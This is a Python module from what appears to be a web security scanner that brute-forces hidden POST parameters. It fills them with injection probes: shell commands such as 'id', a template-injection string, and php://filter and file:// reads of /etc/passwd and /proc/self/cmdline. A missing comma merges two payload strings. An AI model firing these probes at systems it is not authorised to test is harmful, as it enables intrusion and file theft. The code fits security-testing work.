import asyncio
import random

from .mod import Mod, Page, ModTarget, Report
from .requester import Requester
from pathlib import Path

CHUNK_SIZE = 200 # POST可以承载更多的数据

params = [
    "name",
    "cmd",
    "page",
    "file",
    "id",
    "a",
    "b",
    "c",
    "d",
    "e",
    "f",
    "g",
    "h",
    "i",
    "j",
    "k",
    "l",
    "m",
    "n",
    "o",
    "p",
    "q",
    "r",
    "s",
    "t",
    "u",
    "v",
    "w",
    "x",
    "y",
    "z",
]

with open(Path(__file__).parent / "fuzz_dict" / "params_arjun.txt", "r") as f:
    params_arjun = f.readlines()
    params_arjun = [param.strip() for param in params_arjun]
    params += params_arjun

params = list(set(params))
random.shuffle(params)

payloads = [
    "asdf",
    "1234",
    "id",
    "echo 123;",
    "print_r`id`;"
    "?>114514",
    "{{114514}}",
    "/proc/net/arp",
    "data://text/plain,asdf",
    "var_dump(localeconv());",
    "___",
    "##",
    "/**/",
    "--",
    "[]",
    *[
        pattern.format(pathname)
        for pattern in [
            "php://filter/read=convert.base64-encode/resource={}",
            "file://{}",
            "{}",
        ]
        for pathname in [
            "/proc/net/arp",
            "/proc/self/cmdline",
            "/etc/passwd",
            "index.php",
        ]
    ],
]
sem = asyncio.Semaphore(8)

class FindPostParamsMod(Mod):
    def __init__(self, requeser: Requester):
        super().__init__()
        self.requeser = requeser
        self.visited = set()

    async def check(self, thing: ModTarget):
        return 1 if isinstance(thing, Page) and thing.url not in self.visited else 0

    async def request_with_sem(self, url, data):
        async with sem:
            return await self.requeser.request("POST", url, data=data)

    async def crack_params(self, page: Page, example_resp, params):
        for payload in payloads:
            resp = await self.request_with_sem(
                page.url, data={p: payload for p in params}
            )
            if resp.text == example_resp.text:
                continue

            results = await asyncio.gather(
                *[
                    self.request_with_sem(page.url, data={p: payload})
                    for p in params
                ]
            )
            respond_params = [
                p
                for p, resp in zip(params, results)
                if resp.text != example_resp.text
            ]
            if not respond_params:
                continue
            return respond_params
        return []

    async def crack(self, page: Page):
        example_resp = await self.requeser.request("POST", page.url)
        self.visited.add(page.url)
        found_params = []
        params_lists = await asyncio.gather(*[
            self.crack_params(page, example_resp, params[i : i + CHUNK_SIZE])
            for i in range(0, len(params), CHUNK_SIZE)
        ])
        found_params = [param for params in params_lists for param in params]
        if not found_params:
            return []
        if len(found_params) > 20:
            return [Report(f"在页面 {page.url} 找到以下参数：{found_params}，因参数过多不选择继续分析")]
        new_page = Page(url=page.url, mightbe=[], params = page.params, data=found_params)
        return [Report(f"在页面 {page.url} 找到以下参数：{found_params}"), new_page]
